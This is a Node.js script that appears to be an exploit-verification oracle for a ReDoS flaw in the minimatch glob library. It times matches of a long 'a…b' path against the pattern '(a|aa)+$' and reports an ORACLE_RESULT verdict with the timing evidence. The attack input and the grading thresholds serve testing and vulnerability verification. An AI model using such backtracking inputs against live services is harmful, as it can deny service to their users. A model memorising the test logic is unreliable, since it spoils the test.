const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint() / 1000000n);
}

function timeOneCall(path, pattern) {
  const t0 = nowMs();
  minimatch(path, pattern);
  return nowMs() - t0;
}

function avgTopHalf(samples) {
  const sorted = samples.slice().sort((a, b) => a - b);
  const start = Math.floor(sorted.length / 2);
  let sum = 0;
  for (let i = start; i < sorted.length; i++) sum += sorted[i];
  return sum / (sorted.length - start);
}

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const benign = minimatch('file.txt', '*.txt');
  if (benign !== true) throw new Error('benign_call_failed');
  operation_completed = true;

  const attackPath = 'a'.repeat(61) + 'b';
  const attackPattern = '(a|aa)+$';
  const controlPattern = 'a*$';

  // Warmup
  for (let i = 0; i < 8; i++) {
    minimatch(attackPath, controlPattern);
    minimatch(attackPath, attackPattern);
  }

  const attackSamples = [];
  const controlSamples = [];

  for (let i = 0; i < 7; i++) {
    controlSamples.push(timeOneCall(attackPath, controlPattern));
  }
  for (let i = 0; i < 7; i++) {
    attackSamples.push(timeOneCall(attackPath, attackPattern));
  }

  const controlAvg = avgTopHalf(controlSamples);
  const attackAvg = avgTopHalf(attackSamples);
  const ratio = controlAvg > 0 ? attackAvg / controlAvg : (attackAvg > 0 ? 9999 : 1);
  const delta = attackAvg - controlAvg;

  if ((attackAvg >= 25 && ratio >= 8) || (attackAvg >= 80 && delta >= 20) || (ratio >= 30 && delta >= 8)) {
    exploit_succeeded = true;
    evidence = 'redos_slowdown_detected:control_samples_ms=' + controlSamples.join(',') + ',attack_samples_ms=' + attackSamples.join(',') + ',control_avg_tophalf_ms=' + controlAvg.toFixed(3) + ',attack_avg_tophalf_ms=' + attackAvg.toFixed(3) + ',ratio=' + ratio.toFixed(2) + ',delta_ms=' + delta.toFixed(3);
  } else {
    exploit_succeeded = false;
    evidence = 'no_material_slowdown:control_samples_ms=' + controlSamples.join(',') + ',attack_samples_ms=' + attackSamples.join(',') + ',control_avg_tophalf_ms=' + controlAvg.toFixed(3) + ',attack_avg_tophalf_ms=' + attackAvg.toFixed(3) + ',ratio=' + ratio.toFixed(2) + ',delta_ms=' + delta.toFixed(3);
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure:' + ((err && err.message) ? err.message : String(err));
}

emit();